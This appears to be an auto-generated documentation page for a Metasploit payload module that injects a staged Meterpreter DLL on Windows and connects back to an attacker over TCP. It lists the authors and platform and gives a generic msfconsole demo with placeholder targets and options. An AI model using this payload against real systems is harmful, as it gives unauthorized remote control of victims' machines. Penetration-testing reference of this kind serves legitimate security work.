## Windows Meterpreter (skape/jt Injection), Reverse TCP Stager with UUID Support

Inject the meterpreter server DLL (staged). Connect back to 
the attacker with UUID Support


## Module Name
payload/windows/patchupmeterpreter/reverse_tcp_uuid

## Authors
* skape
* jt <jt@klake.org>
* hdm
* OJ Reeves





## Platforms
* win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/windows/patchupmeterpreter/reverse_tcp_uuid
msf payload(reverse_tcp_uuid) > show targets
   ... a list of targets ...
msf payload(reverse_tcp_uuid) > set TARGET <target-id>
msf payload(reverse_tcp_uuid) > show options
   ... show and set options ...
msf payload(reverse_tcp_uuid) > run
```
    
    